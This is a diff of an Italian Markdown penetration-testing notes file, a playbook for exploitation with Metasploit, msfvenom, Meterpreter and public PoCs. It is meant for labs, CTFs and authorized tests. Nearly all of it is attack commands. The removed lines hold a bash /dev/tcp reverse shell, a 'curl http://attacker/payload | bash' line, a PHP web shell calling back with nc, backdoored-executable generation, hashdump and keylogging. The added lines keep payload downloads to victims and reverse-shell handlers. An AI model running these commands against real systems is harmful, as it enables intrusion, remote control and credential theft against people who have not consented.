@@ -1,438 +1,211 @@
-# 💥 Exploitation
+# 💥 Exploitation (Playbook Generale)
 
 Appunti e snippet per la fase di **sfruttamento** delle vulnerabilità.
 
+---
+
 ## 📌 Obiettivi
 
-* Ottenere **RCE**/shell sul target.
-* Stabilire una **sessione stabile** (shell o Meterpreter).
-* Preparare **pivoting** e **post-exploitation**.
+* Ottenere **RCE / shell** sul target.
+* Stabilire una **sessione stabile** (Meterpreter o shell raw).
+* Preparare terreno per **privilege escalation** e **post-exploitation**.
 
-> ⚠️ Uso consentito **solo** in lab/CTF e ambienti con autorizzazione.
+⚠️ Da usare solo in **lab, CTF o pentest autorizzati**.
 
 ---
 
 ## 🧰 Metasploit Framework (MSF)
 
-Metasploit è una piattaforma modulare per **ricerca**, **sfruttamento**, **post-exploitation** e **pivoting**.
+### 🧱 Architettura dei moduli
 
-### 🧱 Architettura (in breve)
+* `exploit/` → sfruttano vulnerabilità note.
+* `auxiliary/` → scanner, brute-force, servizi fake.
+* `payload/` → reverse/bind shell, Meterpreter.
+* `post/` → raccolta info, escalation, pivot.
+* `encoder/`, `nop/` → poco usati oggi.
 
-* **msfconsole** → CLI principale.
-* **Moduli**:
-
-  * `exploit/` (sfruttano vulnerabilità)
-  * `auxiliary/` (scanner, brute-force, server, socks, ecc.)
-  * `payload/` (reverse/bind, meterpreter, stageless/staged)
-  * `post/` (raccolta info, escalation, pivot)
-  * `encoder/` e `nop/` (rari in lab moderni)
-* **DB integrato** (hosts, services, vulns, notes, loot).
-* **Resource scripts** (`.rc`) per automazione.
-
----
-
-### 🚀 Avvio & Database
+### 🚀 Setup rapido
 
 ```bash
-msfdb init          # (una tantum) inizializza DB
-msfconsole -q       # avvia MSF in quiet mode
+msfconsole -q
+db_status
+workspace -a lab1
+setg LHOST <IP_attaccante>
+setg LPORT 4444
 ```
 
-Dentro msfconsole:
+Import scans:
 
-```text
-db_status           # verifica connessione al DB
-workspace -a lab1   # crea e passa al workspace "lab1"
-setg LHOST 10.10.14.23       # variabili globali (es. IP attaccante)
-setg ReverseListenerBindAddress 0.0.0.0
-```
-
-Importa risultati Nmap (utile!):
-
-```text
-db_import ./scans/nmap_full.xml
+```bash
+db_import ./scans/nmap.xml
 hosts; services; vulns
 ```
 
 ---
 
-### 🔎 Ricerca moduli
+## 🔎 Ricerca exploit
+
+### Moduli già interni a MSF
+
+Cerca in `msfconsole`:
 
 ```text
-search type:exploit name:cve-2017 platform:windows
-search app:tomcat type:exploit
-search cve:2011-2523
+search cve:2019
+search type:exploit name:ftp
 ```
 
-Per un modulo:
+Se presente:
 
 ```text
-use exploit/multi/http/tomcat_mgr_upload
-info                   # dettagli, riferimenti, targets
-show options           # parametri richiesti
-show payloads          # payload compatibili
-show targets           # selezione target specifici
+use exploit/multi/ftp/vsftpd_234_backdoor
+info
+show options
+```
+
+👉 Sono già integrati, non serve scaricarli.
+
+---
+
+### Exploit esterni (Exploit-DB / Searchsploit)
+
+Quando trovi un PoC:
+
+```bash
+searchsploit Apache Tomcat
+searchsploit -m exploits/multi/http/12345.py
+python3 12345.py --target 10.10.10.10
+```
+
+👉 Qui devi **scaricare ed eseguire manualmente** lo script.
+
+Puoi anche importarlo in Metasploit:
+
+```bash
+loadpath /usr/share/exploitdb/exploits/
+use 12345
 ```
 
 ---
 
-### 🧪 Workflow standard (checklist)
+## 🧪 Workflow standard
 
-1. **Identifica** servizio/versione (da Recon).
-2. **search** modulo e leggilo con `info`.
-3. `use` il modulo + **set** opzioni chiave:
-
-   * `RHOSTS`, `RPORT`, `SSL`, `TARGET`, `VHOST` (virtual host), `HttpClientTimeout`, ecc.
-4. `check` se supportato (verifica non invasiva).
-5. `set PAYLOAD` (es. `windows/x64/meterpreter/reverse_tcp`).
-6. `set LHOST`/`LPORT` (o già globali).
-7. `exploit -j -z` → in background, non attacca la console.
-8. `sessions -l` / `sessions -i <id>` per interagire.
-
-Esempio completo:
-
-```text
-use exploit/multi/http/tomcat_mgr_upload
-set RHOSTS 10.10.10.10
-set RPORT 8080
-set HttpUsername tomcat
-set HttpPassword s3cr3t
-set TARGET Java Universal
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST 10.10.14.23
-set LPORT 4444
-check
-exploit -j -z
-sessions -l
-sessions -i 1
-```
+1. Identifica servizio/porta/versione (Recon).
+2. Trova exploit (MSF o Exploit-DB).
+3. Carica modulo con `use` **oppure** scarica PoC con `-m`.
+4. Imposta opzioni chiave (`RHOSTS`, `RPORT`, `LHOST`, `LPORT`, `SRVHOST`).
+5. Scegli payload adatto (`show payloads`).
+6. `check` se disponibile.
+7. `exploit -j -z` → avvia in background.
+8. `sessions -l` / `sessions -i N`.
 
 ---
 
-## 🧨 Payload: scelte e concetti
+## 🧨 Payload: concetti chiave
 
-### Staged vs. Stageless
+* **Staged (`/reverse_tcp`)** → piccolo loader, scarica il resto.
+* **Stageless (`_reverse_tcp`)** → payload monolitico.
 
-* **Staged** (`/meterpreter/reverse_tcp`): piccolo stadio iniziale → scarica il resto. Pro: leggero; Contro: più fragile a IDS.
-* **Stageless** (`/meterpreter_reverse_tcp`): monolitico. Pro: meno richieste; Contro: più grande.
+Trasporti comuni:
 
-### Trasporti comuni
-
-* `reverse_tcp` → semplice, diretto.
-* `reverse_http`/`https` → attraversa proxy/firewall, mimetico.
-* `bind_tcp` → raramente utile in CTF moderni (NAT).
-
-### Piattaforma/arch
-
-* `windows/x64/*`, `linux/x64/*`, `python/*`, `java/*`, `php/*`, `cmd/unix/*`, `nodejs/*`, ecc.
+* `reverse_tcp` → semplice e diretto.
+* `reverse_http/https` → stealth, bypass firewall.
+* `bind_tcp` → raro in CTF moderni.
 
 ---
 
-## 🧪 Meterpreter 101 (uso essenziale)
+## 🧪 Shell & Meterpreter
 
-Dentro la sessione:
-
-```text
-help; sysinfo; getuid
-ps; migrate <pid>          # stabilizza su processo affidabile
-shell                      # shell di sistema
-download /path/file .
-upload local.bin /tmp/
-background                 # Ctrl+Z e poi "bg"
-```
-
-Moduli post utili:
+### Meterpreter
 
 ```text
-run post/multi/manage/autoroute  # aggiunge rotte per la subnet del target
-portfwd add -l 8080 -p 80 -r 10.10.10.10  # port forwarding
-screenshare; screenshot; keyscan_start/stop
-hashdump                      # se permessi
-```
-
-> Tip: per stabilità immediata:
-> `set AutoRunScript post/windows/manage/migrate` (o `migrate -f` manuale).
-
----
-
-## 🌉 Pivoting con MSF (autoroute + SOCKS)
-
-### Scenario
-
-Hai una sessione meterpreter su **Host A (10.10.10.10)** che vede **Subnet B (10.10.11.0/24)**.
-
-**Passi:**
-
-1. Aggiungi route automaticamente:
-
-```text
-sessions -i 1
-run post/multi/manage/autoroute
-# oppure manuale:
-run post/multi/manage/autoroute CMD=add SUBNET=10.10.11.0 NETMASK=255.255.255.0
+getuid; sysinfo
+ps; migrate <pid>       # stabilizza
+shell                   # passa a cmd/PowerShell
+download flag.txt .
+upload payload.exe C:\\Temp\\
 background
 ```
 
-2. Avvia un **SOCKS proxy** in Metasploit:
+### CMD/PowerShell nativa
 
-```text
-use auxiliary/server/socks_proxy
-set SRVHOST 127.0.0.1
-set SRVPORT 1080
-set VERSION 4a
-run -j
-```
+* `whoami`, `dir`, `cd`, `curl`.
+* Da usare per interagire come se fossi sul sistema.
 
-3. Imposta uso proxy per moduli MSF:
+👉 Ricorda: `whoami` in Meterpreter ❌, devi aprire `shell`.
 
-```text
-setg Proxies socks4:127.0.0.1:1080
-```
+---
 
-4. Usa tool esterni con `proxychains`:
+## 📦 Trasferimento file
+
+### Con http.server
+
+Attaccante:
 
 ```bash
-proxychains nmap -sT -Pn 10.10.11.15
-proxychains crackmapexec smb 10.10.11.0/24
+python3 -m http.server 80
+```
+
+Vittima (CMD):
+
+```cmd
+curl http://<IP_attaccante>/payload.exe -o payload.exe
+```
+
+### Con Meterpreter
+
+```text
+upload payload.exe C:\\Temp\\
+download C:\\Users\\user\\Desktop\\file.txt .
 ```
 
 ---
 
-## 🎛️ Handler universale (manual delivery)
+## 🧩 Exploitation esterna + Handler MSF
 
-Quando **consegni il payload tu** (upload via web shell, RCE, file share ecc.), usa l’**handler**:
+Quando usi PoC/script esterni, apri un handler MSF per ricevere la shell:
 
 ```text
 use exploit/multi/handler
-set PAYLOAD linux/x64/meterpreter_reverse_tcp
-set LHOST 10.10.14.23
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <IP_attaccante>
 set LPORT 4444
-set ExitOnSession false     # accetta più connessioni
+set ExitOnSession false
 exploit -j
 ```
 
-> Usalo anche insieme a **msfvenom** (vedi sotto) per ricevere la callback.
+Poi fai eseguire il payload alla vittima (via exploit esterno, webshell, ecc.).
 
 ---
 
-## 🧪 msfvenom (generazione payload)
+## 🧯 Troubleshooting (problemi comuni)
 
-### Elenca payload
-
-```bash
-msfvenom -l payloads | grep meterpreter
-```
-
-### Genera binari/eseguibili
-
-```bash
-# Windows EXE (x64)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe -o payload.exe
-
-# Linux ELF
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f elf -o payload.elf
-
-# Web (PHP)
-msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f raw -o shell.php
-
-# Java WAR (Tomcat)
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f war -o shell.war
-```
-
-### Raw one-liner (Bash)
-
-```bash
-msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.23 LPORT=4444 -f raw
-```
-
-### Opzioni utili
-
-```bash
-# Evita caratteri bad
-msfvenom -p ... -b "\x00\x0a\x0d" -f c
-
-# Usa template (app embedding)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... \
-  -x template.exe -k -f exe -o emb_payload.exe
-```
-
-> Ricorda: collega sempre l’**handler** giusto in ascolto.
+* ❌ **No callback** → LHOST errato (usa IP VPN/tun0).
+* ❌ **hashdump fallisce** → non sei SYSTEM. Usa `getsystem` o `local_exploit_suggester`.
+* ❌ **`whoami` o `cd` non funzionano** → sei in Meterpreter, apri `shell`.
+* ❌ **`curl` fallisce** → non hai avviato `http.server` o porta/IP sbagliati.
+* ❌ **Sessione instabile** → migra subito o usa `reverse_https`.
 
 ---
 
-## 📜 Automazione con Resource Scripts (.rc)
+## 📊 Tabella comparativa exploit
 
-Crea `tomcat.rc`:
-
-```text
-workspace -a lab-tomcat
-setg LHOST 10.10.14.23
-use exploit/multi/http/tomcat_mgr_upload
-set RHOSTS 10.10.10.10
-set RPORT 8080
-set HttpUsername tomcat
-set HttpPassword s3cr3t
-set PAYLOAD java/meterpreter/reverse_tcp
-set LPORT 4444
-exploit -j -z
-```
-
-Esegui:
-
-```bash
-msfconsole -r tomcat.rc
-```
+| Fonte exploit               | Come si usa                | Esempio comando                             | Note                                                      |
+| --------------------------- | -------------------------- | ------------------------------------------- | --------------------------------------------------------- |
+| **Modulo MSF interno**      | `use exploit/...`          | `use exploit/multi/ftp/vsftpd_234_backdoor` | Già integrato in Metasploit                               |
+| **Exploit-DB (PoC)**        | `searchsploit -m` + esegui | `python3 46540.py --target 10.10.10.10`     | Script indipendente (Python, C, Perl…)                    |
+| **Exploit-DB (modulo MSF)** | `use exploit/...`          | `use exploit/windows/http/xyz_module`       | Spesso duplicato: searchsploit lo mostra, ma è già in MSF |
+| **Exploit-DB PoC → MSF**    | `loadpath`                 | `loadpath /usr/share/exploitdb/exploits/`   | Per importare script PoC come moduli personalizzati       |
 
 ---
 
-## 🧪 Moduli Auxiliary utili in fase di exploit
+## ✅ Checklist finale
 
-```text
-use auxiliary/scanner/ssh/ssh_login              # brute/creds SSH
-use auxiliary/scanner/http/http_login            # brute HTTP basic/digest
-use auxiliary/scanner/smb/smb_login              # brute SMB
-use auxiliary/admin/http/tomcat_administration   # gestisce credenziali/manager
-use auxiliary/server/capture/*                   # listener “fake” per catturare credenziali
-```
-
----
-
-## 🧩 Esempi pratici (end-to-end)
-
-### 1) vsftpd 2.3.4 backdoor (classico HTB/THM)
-
-```text
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 10.10.10.10
-set RPORT 21
-run
-# Se vulnerabile: ottieni shell / sessione
-```
-
-### 2) Web RCE → Handler MSF
-
-* Hai un RCE (es. `curl http://attacker/payload | bash`).
-* Avvia handler:
-
-  ```text
-  use exploit/multi/handler
-  set PAYLOAD linux/x64/meterpreter_reverse_tcp
-  set LHOST 10.10.14.23
-  set LPORT 4444
-  exploit -j
-  ```
-* Consegna payload dal RCE:
-
-  ```bash
-  bash -c 'exec 5<>/dev/tcp/10.10.14.23/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
-  ```
-
-  *(oppure carica ed esegui `payload.elf` generato con msfvenom).*
-
-### 3) Authenticated exploit (psexec)
-
-```text
-use exploit/windows/smb/psexec
-set RHOSTS 10.10.10.20
-set SMBUser Administrator
-set SMBPass 'Passw0rd!'
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 10.10.14.23
-run
-```
-
----
-
-## 🧯 Troubleshooting & Tips
-
-* **Nessuna callback?**
-
-  * Verifica `LHOST` (IP corretto / interfaccia VPN HTB/THM).
-  * Cambia trasporto: `reverse_http` / `reverse_https`.
-  * Su NAT: `ReverseListenerBindAddress 0.0.0.0` e `LHOST` pubblico/VPN.
-  * Firewall host attaccante: apri la porta `LPORT`.
-* **Modulo fallisce a metà?**
-
-  * `set VERBOSE true`, aumenta `WfsDelay` (WebApp lente).
-  * Prova **stageless** (`*_reverse_tcp`) o **arch** coerente (x86 vs x64).
-* **Sessione instabile?**
-
-  * Subito `migrate` su processo affidabile.
-  * Usa `reverse_https` (più resiliente).
-* **Proxy corporate (in lab)?**
-
-  * Preferisci `reverse_http[s]` e imposta `Proxy*` se richiesto.
-* **Loop di exploit?**
-
-  * `set ExitOnSession false` + `exploit -j` per catturare più callback.
-
----
-
-## 🧪 Sfruttamento senza Metasploit (quick refs)
-
-* **searchsploit** per PoC pubblici:
-
-  ```bash
-  searchsploit <software> <version>
-  searchsploit -m exploits/linux/local/12345.c
-  ```
-* **Python PoC**:
-
-  ```bash
-  python3 exploit.py --target 10.10.10.10 --rhost 10.10.14.23 --rport 4444
-  ```
-* **Web shell** (se uploadabile):
-
-  ```php
-  <?php system($_GET['cmd']); ?>
-  # curl "http://target/shell.php?cmd=nc -e /bin/sh 10.10.14.23 4444"
-  ```
-
-> Dopo l’accesso, passa a **Post Exploitation** (`9 - Post Exploitation.md`) e agli strumenti di **Privilege Escalation** (`6 - Privilege Escalation.md`).
-
----
-
-## 📚 Comandi rapidi Metasploit (mini-cheatsheet)
-
-```text
-# DB / Workspace
-db_status
-workspace -a <name>; workspace
-
-# Ricerca / Info
-search <query>
-use <module>
-info; show options; show payloads; show targets
-
-# Exploit
-set RHOSTS <ip|range>
-set RPORT <port>
-set PAYLOAD <payload>
-set LHOST <ip>; set LPORT <port>
-check
-exploit -j -z
-
-# Sessioni
-sessions -l
-sessions -i <id>
-background   # (Ctrl+Z)
-setg Proxies socks4:127.0.0.1:1080
-
-# Meterpreter
-sysinfo; getuid; ps; migrate <pid>
-upload; download; shell; portfwd
-run post/multi/manage/autoroute
-```
-
----
-
-## ✅ Checklist finale (prima di lanciare l’exploit)
-
-* [ ] Confermato **servizio/versione** e **porta**.
-* [ ] Modulo scelto con `info` e **opzioni** capite.
-* [ ] **Payload** coerente (piattaforma/arch/trasporto).
-* [ ] **LHOST/LPORT** corretti e **handler** pronto.
-* [ ] Impostate opzioni di **stabilità** (migrate/https).
-* [ ] Se serve, configurato **pivoting** (autoroute + socks).
+* [ ] Ho confermato la vulnerabilità (porta/versione).
+* [ ] Ho scelto exploit → modulo MSF o PoC esterno.
+* [ ] Ho impostato correttamente RHOSTS/RPORT.
+* [ ] Ho configurato LHOST/LPORT corretti (IP VPN).
+* [ ] Ho avviato l’handler o exploit.
+* [ ] Ho stabilizzato la sessione (`migrate`).
+* [ ] Sono pronto al post-exploitation (loot/escalation).
 
 ---
